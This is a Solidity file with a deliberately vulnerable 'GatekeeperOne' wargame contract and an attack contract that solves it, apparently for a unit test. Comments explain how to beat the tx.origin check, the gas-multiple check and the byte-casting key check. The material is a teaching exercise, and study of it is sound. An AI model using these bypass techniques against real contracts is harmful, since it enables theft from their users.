// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  // to bypass first gate, call enter() via attack contract
  // msg.sender = attack contract
  // tx.origin  = user invoking attack contract
  modifier gateOne() {
    require(msg.sender != tx.origin, "Failed Gate1");
    _;
  }

  // to bypass second gate, enter() must be called with
  // gas being a multiple of 8191
  modifier gateTwo() {
    require(gasleft() % 8191 == 0, "Failed Gate2");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

// solution used by unit test
// see https://solidity-by-example.org/hacks/phishing-with-tx-origin/
contract GatekeeperOneAttack {
   GatekeeperOne vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  GatekeeperOne(_vulnContract);
  }

  function attack(uint gasInput) external {
    // to work out solution copy vulnerable contract
    // checking code & calculcate the key
    // let x = uint64(_gateKey)
    //uint32(x) == uint16(x)
    //uint32(x) != x
    //uint32(x) == uint16(uint160(tx.origin))

    // first start with condition based on input (tx.origin)
    uint16 x16 = uint16(uint160(tx.origin));

    // shift 1 63 times to bypass uint32(x) != x
    uint64 x64 = uint64(1 << 63) + uint64(x16);

    vulnContract.enter{gas: gasInput}(bytes8(x64));
  }
}